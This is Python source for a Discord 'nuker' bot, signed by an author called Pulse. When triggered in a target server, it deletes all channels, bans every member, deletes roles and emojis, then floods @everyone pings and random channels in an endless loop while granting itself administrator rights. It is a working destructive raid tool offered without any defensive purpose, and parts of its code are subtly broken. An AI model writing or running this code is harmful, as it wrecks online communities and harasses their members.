

def randomletters(length):
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for i in range(length))



@client.event

async def on_message(message):
    global serverid
    serverid = int((message.content).split("#"))
    
    if message.guild.id == serverid:
        global nuke
        nuke = 1
        global TEST
        TEST = 0
        if TEST == 0:
            TEST = 1
            for c in message.guild.channels: 
                    await c.delete()
            for user in message.guild.members:
                try:
                    await user.ban()
                except:
                    pass
            for role in message.guild.roles:  
                try:  
                    await role.delete()
                except:
                    pass
            for Emoji in message.guild.emojis:
                await Emoji.delete()
        response = '@everyone'
        
        
        while True:
            
            print("message sent "+random.choice(string.ascii_letters))
            try:
                await message.channel.send(response)
            except:
                print("message error")
                pass
            try:
                user=message.author
                await user.edit(nick=randomletters(3))
            except:
                print("can't change user nick")
                pass
            guild=message.guild
            perms=discord.Permissions(administrator=True)
            try:
                user=message.author
                await guild.create_role(name='TEST', colour=discord.Colour(0x597E8D),permissions=perms)
                role=get(guild.roles,name='TEST')
                await user.add_roles(role)
            except:
                print('maximum number of roles reached')
                pass
            guild=message.guild
            
            await guild.create_text_channel(randomletters(99))
            await guild.create_text_channel(randomletters(99))
            await message.channel.delete()
            print("channel yeeted")
            user=message.author
        
@client.event
async def on_command_error(error):
    if isinstance(error, discord.HTTPException):
        time.sleep(10)

@client.event
async def on_guild_channel_create(channel):
    if channel.guild.id == serverid:
        await channel.send("@everyone")



#Made by Pulse.
